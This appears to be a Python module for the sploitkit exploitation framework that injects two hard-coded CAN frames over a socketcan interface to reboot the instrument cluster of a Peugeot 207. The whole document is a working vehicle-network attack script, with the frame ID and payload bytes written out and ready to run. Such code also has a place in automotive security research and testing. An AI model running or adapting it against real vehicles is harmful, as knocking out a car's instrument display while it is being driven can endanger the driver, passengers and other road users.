from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan
import time

class peugeot207_ic_reboot(Module):
    """ This module will reboot the instrument cluster of a Peugeot 207.   

    Author:  shipcod3
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Rebooting the cluster...")
        frame = can.Frame(0x036)
        frame.data = [0x80,0x89,0x50,0x70,0x72,0xE0,0xF2,0x28]
        dev.send(frame)
        frame.data = [0xB8,0x96,0xCF,0x44,0x9D,0x6A,0xAF,0x54]
        dev.send(frame)
        pass
